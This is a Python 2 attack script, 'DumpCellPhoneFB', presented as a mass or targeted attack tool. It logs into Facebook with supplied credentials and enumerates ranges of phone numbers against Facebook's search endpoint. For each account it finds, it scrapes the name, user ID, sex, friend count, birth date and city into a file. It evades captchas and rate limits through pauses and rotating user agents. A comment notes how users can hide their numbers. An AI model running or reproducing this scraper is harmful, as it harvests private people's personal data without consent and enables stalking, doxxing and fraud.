#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests,time,random
from re import findall


class bcolors:
	OKGREEN = '\033[92m'
	GREEN = "\033[1;32m"
	GREENUNDER	=	"\033[4;32m"
	RED = '\033[91m'
	WARNING = '\033[93m'
	BASICY = "\033[0;33m"
	YELLOW = "\033[1;33m"
	BRED = "\033[0;31m"
	RED2 = "\033[1;31m"
	UNDERLINE = '\033[4m'
	ENDC = '\033[0m'
banner = """
 ____                         ____     _ _ ____  _                      _____  ___
|  _ \ _   _ _ __ ___  _ __  / ___|___| | |  _ \| |__   ___  _ __   ___|  ___||	__)
| | | | | | | '_ ` _ \| '_ \| |   / _ \ | | |_) | '_ \ / _ \| '_ \ / _ \ |_   |  _ \\
| |_| | |_| | | | | | | |_) | |__|  __/ | |  __/| | | | (_) | | | |  __/  _|  | |_) |
|____/ \__,_|_| |_| |_| .__/ \____\___|_|_|_|   |_| |_|\___/|_| |_|\___|_|    |_____/
By t3nxuts! v1.5      |_|
https://www.youtube.com/channel/UCtSfcWW4fEpczHyKeInJ8aA """

 #https://fb.com/Dark.Cristopher
 #DumpCellPhoneFB extrae informacion a base de los numeros telefonicos publicos de facebook, si no quieres exponer tu numero celular,sigue los siguientes pasos..
 #opcion: privacidad,
 #opcion: ¿Quién puede buscarme?,
 #opcion:¿Quién puede buscarte con el número de teléfono que proporcionaste?
 #configurarlo en privado, ya q por defecto es PUBLICA!!

print bcolors.RED + banner


global a,b,code,uid,head,s

def user_agent():
    ua = ['Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.0.8)', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2', 'Opera/9.21 (Windows NT 5.1; U; nl)', 'Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1', 'Opera/9.51 (X11; Linux i686; U; Linux Mint; en)', 'Opera/9.62 (Windows NT 5.1; U; tr) Presto/2.1.1','Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61', 'Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50']
    return random.choice(ua)


def DumpCellPhoneFB():
		#
		try:
			archivo = open('DumpCellPhoneFB.sql','r')
			archivo.close()
		except IOError:
			print 'guardando en ./DumpCellPhoneFB.sql'
			archivo = open('DumpCellPhoneFB.sql','w')
			archivo.close()

		opcion = int(raw_input(bcolors.RED+"\nseleccione el tipo ataque, masivo(0) o target(1):# "))
		if opcion == 0 :
			code = raw_input("\ncheck ./zipcode, ingrese el zipcode ej: +51 :# ")
			print "ingrese un rango valido eje: desde: 999999111 hasta: 999999222"
			a = int(raw_input("desde:# "))
			b = int(raw_input("hasta:# "))
		else:
			code = raw_input("\ncheck ./zipcode, ingrese el zipcode ej: +51 :# ")
			a = int(raw_input("\ningrese el target:# "))
			b = a

		url = 'https://www.facebook.com/ajax/typeahead/search.php'
		cli = findall('\/mbasic\/\?av=([\d]{5,})&',uid)[0]

		#contadores
		cont = 0
		peti = 0
		i = 300
		check = 0

		for n in range(a,b+1):
			cont += 1
			peti += 1
			
			if cont == 350:	# luego de 350 request crear un intervalo de 15 request para evitar el molesto captcha
				i = 15		#15
				cont = 0
				time.sleep(30)

			elif cont == i:
				print bcolors.RED+"#====================================================================#"
				print "pausando algunos segundos para evitar captchaRefresh "
				time.sleep(30) #s
				cont = 0
			num = str(code) + str(n)
			class Parametros:
				pm1 = {'__pc':'EXP1:DEFAULT','value':num,'viewer':cli, 'rsp':'search', 'context':'default', '__a':'1', '__req':'n'} 	
				pm2 = {'__pc':'EXP1:DEFAULT','value':check, 'viewer':cli, 'rsp':'search', 'context':'default', '__a':'1', '__req':'n'}


			time.sleep(0.2)				#intervalo entre request
			r = s.get(url,headers=head,params=Parametros.pm1)
			data = r.content
		
			user = findall('"names":\["([a-zA-Z\s]{3,})"\],"needs',data)
			xy = user[0] if len(user) > 0 else ''


			z = findall('"uid":([\d]{5,}),"',data)
			zw = z[0] if len(z) > 0 else ''

			p = findall('subtitle":{(.{3,})},"subtext"',data)
			
			_url = 'https://m.facebook.com/'+str(zw)

			_r = s.get(_url,headers=head)
			_data = _r.content
			

			_x = findall('los amigos \(([\d]+)\)',_data)
			frf = _x[0] if len(_x) > 0 else 'private'

			v = findall('">([\w\s]{3,})</a></div></td></tr></table></div></div><div class=',_data)

			if _data.find("Fecha") > 0:
				nac = findall('class=".+">([\w\s]{6,})</div></td></tr></table></div><div class=".+" title="Sexo">',_data)
				naci = nac[0] if len(nac) > 0 else ''
			else:
				naci = ''

			sex = "Hombre" if _data.find('Hombre') >= 0 else "Mujer"

			if len(xy) > 0  :
				check = num
				print bcolors.OKGREEN+"#====================================================================#"
				print "Numero",num
				print "User: ",xy
				print "ID: ", zw
				print "sexo: ",sex
				print 'Friends: ',frf

				if len(p) > 0:
					print "Info: ", p[0]
					
				if len(naci) > 0 :
					print "Fecha de Nacimiento: " ,naci

				if len(v) > 0 :
					print "ciudad actual: ",v[0]

				contenido = [num,xy,' ID:',zw,sex,naci,' Friends:',frf,p,v]
				contenido = str(contenido)
				_archivo = open('DumpCellPhoneFB.sql','a')
				_archivo.write(contenido+'\n')
				_archivo.close()

				print "#====================================================================#"

			elif data.find('captchaRefresh') > 0:
				print bcolors.RED+"#====================================================================#"
				print " alert CaptchaRefresh se reanudará en algunos segundos"

				i = 15
				cont = 0
				time.sleep(30)#si responde con validacion de captcha pausar 30s y continuar

			else:
				print bcolors.WARNING ,num, "desconocido/private"

			if peti == 80:	#cada 80 request comprueba si el response esta funcionado correctamente
				r = s.get(url,headers=head,params=Parametros.pm2)
				data = r.content
				if findall('"uid":([\d]{5,}),"',data) != []:
					print bcolors.OKGREEN+'HTTP/200 ok'
					peti = 0
				elif data.find('captchaRefresh') > 0:
					print 'modo captcha refresh continudando'
					peti = 0
				else:
					print bcolors.RED+'funcion banned!!! no se permite mas peticiones cellphone!!. Ejecutar el script con otra cuenta FB'
					break

############################################################################################################################

if __name__ == "__main__":

	usuario = raw_input("usuario:#  ")
	password = raw_input("password:# ")

	#almacenar credenciales, comentar las 2 filas anteriores y guardar las credenciales en la variables usuario y password de la next fila entre comillas para evitar ingresala cada q corre el script.
	aut = {'email':usuario,'pass':password}

	head = {'User-Agent': user_agent(),
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Referer': 'https://m.facebook.com/',
			'Connection': 'keep-alive'}
	s = requests.session()
	log = s.post('https://m.facebook.com/login.php', data=aut,headers=head)
	uid = log.content

	if uid.find('>Forgot Password?<') > 0 :
				print "username / password incorrecto!"
	else:
		print bcolors.OKGREEN+"\nsesion valida!"
		DumpCellPhoneFB()